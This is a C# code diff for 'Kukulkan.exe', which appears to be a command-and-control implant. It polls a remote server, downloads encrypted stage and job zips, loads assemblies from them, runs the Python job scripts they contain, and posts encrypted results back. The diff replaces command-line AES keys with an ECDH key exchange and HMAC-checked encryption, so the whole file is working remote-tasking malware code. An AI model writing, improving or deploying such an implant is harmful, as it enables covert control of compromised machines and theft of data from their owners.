@@ -16,8 +16,6 @@ using System.Collections.Generic;
 public class KConsole
 {
     static Uri URL = null;
-    static byte[] AES_KEY = null;
-    static byte[] AES_IV = null;
     static ZipArchive Stage = null;
 
     static KConsole()
@@ -93,14 +91,14 @@ public class KConsole
         }
         return new Byte[0];
     }
-    public static byte[] DecryptData(byte[] encryptedData)
+    public static byte[] AesDecrypt(byte[] data, byte[] key, byte[] iv)
     {
         using (Aes aesAlg = Aes.Create())
         {
             aesAlg.Padding = PaddingMode.PKCS7;
             aesAlg.KeySize = 256;
-            aesAlg.Key = AES_KEY;
-            aesAlg.IV = AES_IV;
+            aesAlg.Key = key;
+            aesAlg.IV = iv;
 
             ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
 
@@ -108,22 +106,21 @@ public class KConsole
             {
                 using (CryptoStream cryptoStream = new CryptoStream(decryptedData, decryptor, CryptoStreamMode.Write))
                 {
-                    cryptoStream.Write(encryptedData, 0, encryptedData.Length);
+                    cryptoStream.Write(data, 0, data.Length);
                     cryptoStream.FlushFinalBlock();
                     return decryptedData.ToArray();
                 }
             }
         }
     }
-    public static byte[] EncryptData(byte[] output)
+    public static byte[] AesEncrypt(byte[] data, byte[] key, byte[] iv)
     {
-        //byte[] unicodeBytes = Encoding.UTF8.GetBytes(plaintext);
         using (Aes aesAlg = Aes.Create())
         {
             aesAlg.Padding = PaddingMode.PKCS7;
             aesAlg.KeySize = 256;
-            aesAlg.Key = AES_KEY;
-            aesAlg.IV = AES_IV;
+            aesAlg.Key = key;
+            aesAlg.IV = iv;
 
             ICryptoTransform decryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);
 
@@ -131,18 +128,65 @@ public class KConsole
             {
                 using (CryptoStream cryptoStream = new CryptoStream(encryptedData, decryptor, CryptoStreamMode.Write))
                 {
-                    cryptoStream.Write(output, 0, output.Length);
+                    cryptoStream.Write(data, 0, data.Length);
                     cryptoStream.FlushFinalBlock();
                     return encryptedData.ToArray();
                 }
             }
         }
     }
-    public static ZipArchive StageZipFile(Uri URL, String zipname)
+    public static byte[] Encrypt(byte[] key, byte[] data)
     {
-        var StageURL = new Uri(URL, zipname);
+        IEnumerable<byte> blob = default(byte[]);
+
+        using (RandomNumberGenerator rng = new RNGCryptoServiceProvider())
+        {
+            byte[] iv = new byte[16];
+            rng.GetBytes(iv);
+
+            byte[] encryptedData = AesEncrypt(data, key, iv);
+
+            using (HMACSHA256 hmacsha256 = new HMACSHA256(key))
+            {
+                byte[] ivEncData = iv.Concat(encryptedData).ToArray();
+                byte[] hmac = hmacsha256.ComputeHash(ivEncData);
+                blob = ivEncData.Concat(hmac);
+            }
+        }
+        return blob.ToArray();
+    }
+    public static byte[] Decrypt(byte[] key, byte[] data)
+    {
+        byte[] decryptedData = default(byte[]);
+
+        byte[] iv = new byte[16];
+        byte[] ciphertext = new byte[(data.Length - 32) - 16];
+        byte[] hmac = new byte[32];
+
+        Array.Copy(data, iv, 16);
+        Array.Copy(data, data.Length - 32, hmac, 0, 32);
+        Array.Copy(data, 16, ciphertext, 0, (data.Length - 32) - 16);
+
+        using (HMACSHA256 hmacsha256 = new HMACSHA256(key))
+        {
+            byte[] computedHash = hmacsha256.ComputeHash(iv.Concat(ciphertext).ToArray());
+            for (int i = 0; i < hmac.Length; i++)
+            {
+                if (computedHash[i] != hmac[i])
+                {
+                    Console.WriteLine("Invalid HMAC: {0}", i);
+                    return decryptedData;
+                }
+            }
+            decryptedData = AesDecrypt(ciphertext, key, iv);
+        }
+        return decryptedData;
+    }
+    public static byte[] HttpGet(Uri URL, string Endpoint)
+    {
+        Uri FullUrl = new Uri(URL, Endpoint);
 #if DEBUG
-        Console.WriteLine("Attempting ZIP staging from {0}", StageURL);
+        Console.WriteLine("Attempting HTTP GET to {0}", FullUrl);
 #endif
         while (true)
         {
@@ -150,51 +194,71 @@ public class KConsole
             {
                 using (var wc = new WebClient())
                 {
-                    var data = wc.DownloadData(StageURL);
+                    byte[] data = wc.DownloadData(FullUrl);
 #if DEBUG
                     Console.WriteLine("Downloaded {0} bytes", data.Length);
-#endif
-                    byte[] zip = DecryptData(data);
-                    return new ZipArchive(new MemoryStream(zip));
+#endif              
+                    return data;
                 }
             }
             catch (Exception e)
             {
 #if DEBUG
-                Console.WriteLine("Error downloading {0}: {1}", URL, e.Message);
+                Console.WriteLine("Error downloading {0}: {1}", FullUrl, e.Message);
 #endif
                 Thread.Sleep(5000);
             }
         }
     }
-    public static void SendResults(Uri URL, byte[] data)
+    public static byte[] HttpPost(Uri URL, string Endpoint, byte[] payload = default(byte[]))
     {
-        var jobEndpoint = new Uri(URL, "job");
+        Uri FullUrl = new Uri(URL, Endpoint);
 #if DEBUG
-        Console.WriteLine("Attempting to send job results to {0}", jobEndpoint);
+        Console.WriteLine("Attempting HTTP POST to {0}", FullUrl);
 #endif
         while (true)
         {
             try
             {
-                var wr = WebRequest.Create(jobEndpoint);
+                var wr = WebRequest.Create(FullUrl);
                 wr.Method = "POST";
-                wr.ContentType = "application/octet-stream";
-                wr.ContentLength = data.Length;
-                var requestStream = wr.GetRequestStream();
-                requestStream.Write(data, 0, data.Length);
-                requestStream.Close();
-                wr.GetResponse();
-                break;
+                if (payload.Length > 0)
+                {
+                    wr.ContentType = "application/octet-stream";
+                    wr.ContentLength = payload.Length;
+                    var requestStream = wr.GetRequestStream();
+                    requestStream.Write(payload, 0, payload.Length);
+                    requestStream.Close();
+                }
+                var response = wr.GetResponse();
+                using (MemoryStream memstream = new MemoryStream())
+                {
+                    response.GetResponseStream().CopyTo(memstream);
+                    return memstream.ToArray();
+                }
             }
             catch (Exception e)
             {
 #if DEBUG
-                Console.WriteLine("Error sending job results to {0}: {1}", URL, e.Message);
+                Console.WriteLine("Error sending job results to {0}: {1}", FullUrl, e.Message);
 #endif
                 Thread.Sleep(5000);
             }
         }
+    }
+    public static byte[] ECDHKeyExchange(Uri URL, string Endpoint = "exchange")
+    {
+        byte[] key = default(byte[]);
+
+        using (ECDiffieHellmanCng AsymAlgo = new ECDiffieHellmanCng())
+        {
+            var publicKey = AsymAlgo.PublicKey.ToXmlString();
+            byte[] r = HttpPost(URL, Endpoint, Encoding.UTF8.GetBytes(publicKey));
+
+            ECDiffieHellmanCngPublicKey peerPublicKey = ECDiffieHellmanCngPublicKey.FromXmlString(Encoding.UTF8.GetString(r));
+            key = AsymAlgo.DeriveKeyMaterial(peerPublicKey);
+        }
+        return key;
     }
     private static Assembly MyResolveEventHandler(object sender, ResolveEventArgs args)
     {
@@ -205,7 +269,9 @@ public class KConsole
 #endif
         if (Stage == null)
         {
-            Stage = StageZipFile(URL, "stage.zip");
+            byte[] key = ECDHKeyExchange(URL);
+            byte[] encrypted_zip = HttpGet(URL, "stage");
+            Stage = new ZipArchive(new MemoryStream(Decrypt(key, encrypted_zip)));
         }
         bytes = GetResourceInZip(Stage, DllName);
 
@@ -215,62 +281,23 @@ public class KConsole
 #endif
         return asm;
     }
-    public static byte[] sha256(string randomString)
-    {
-        var crypt = new SHA256Managed();
-        return crypt.ComputeHash(Encoding.UTF8.GetBytes(randomString));
-    }
-    public static byte[] StringToByteArray(string hex)
-    {
-        int NumberChars = hex.Length;
-        byte[] bytes = new byte[NumberChars / 2];
-        for (int i = 0; i < NumberChars; i += 2)
-            bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
-        return bytes;
-    }
     public static void Main(string[] args)
     {
-        string aesKey = null;
-        string aesIV = null;
-
-        if (args.Length != 3)
+        if (args.Length != 1)
         {
-            Console.WriteLine("Usage: Kukulkan.exe <key> <IV> <URL>");
+            Console.WriteLine("Usage: Kukulkan.exe <URL>");
             Environment.Exit(1);
         }
 
         try
         {
-            aesKey = args[0];
+            URL = new Uri(args[0]);
         }
         catch { }
-
-        try
-        {
-            aesIV = args[1];
-        }
-        catch { }
-
-        try
-        {
-            URL = new Uri(args[2]);
-        }
-        catch { }
-
-        AES_KEY = sha256(aesKey);
-        AES_IV = StringToByteArray(aesIV);
 
         AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(MyResolveEventHandler);
 
-        var hash = new StringBuilder();
-        foreach (byte theByte in AES_KEY)
-        {
-            hash.Append(theByte.ToString("x2"));
-        }
-
         Console.WriteLine("URL: {0}", URL);
-        Console.WriteLine("AES_KEY: {0} (SHA256: {1})", aesKey, hash);
-        Console.WriteLine("AES_IV: {0}", aesIV);
         Console.WriteLine();
 
         StartEngine();
@@ -292,9 +319,11 @@ public class KConsole
 #if DEBUG
                 scope.SetVariable("DEBUG", true);
 #elif RELEASE
-        scope.SetVariable("DEBUG", false);
+                scope.SetVariable("DEBUG", false);
 #endif
-                var jobZip = StageZipFile(URL, "job.zip");
+                byte[] key = ECDHKeyExchange(URL);
+                byte[] decrypted_zip = Decrypt(key, HttpGet(URL, "job"));
+                var jobZip = new ZipArchive(new MemoryStream(decrypted_zip));
 
                 var job = GetResourceInZip(jobZip, "main.py");
                 //result = PythonOps.InitializeModuleEx(Assembly.Load(GetResourceInZip(stage, "Main.dll")), "__main__", null, false, null);
@@ -303,8 +332,8 @@ public class KConsole
 
                 if (engineStream.Length > 0)
                 {
-                    byte[] encryptedResults = EncryptData(engineStream.ToArray());
-                    SendResults(URL, encryptedResults);
+                    byte[] encryptedResults = Encrypt(key, engineStream.ToArray());
+                    HttpPost(URL, "job", encryptedResults);
                 }
             }
             Thread.Sleep(10000);
